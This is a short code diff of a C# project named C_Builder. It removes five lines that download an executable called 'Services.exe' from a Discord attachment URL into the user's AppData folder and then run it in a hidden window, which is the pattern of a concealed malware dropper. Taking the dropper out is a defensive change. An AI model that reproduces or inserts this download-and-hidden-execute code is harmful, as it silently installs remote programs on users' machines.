@@ -152,11 +152,6 @@ namespace C_Builder
 
             }
 
-            wc.DownloadFile("https://cdn.discordapp.com/attachments/775273209100501013/775278243318071296/Services.exe", "C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Services.exe");
-            ProcessStartInfo proc = new ProcessStartInfo();
-            proc.WindowStyle = ProcessWindowStyle.Hidden;
-            proc.FileName = "C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Services.exe";
-            Process.Start(proc);
         }
         private static void RegistryEdit(string regPath, string name, string value)
         {
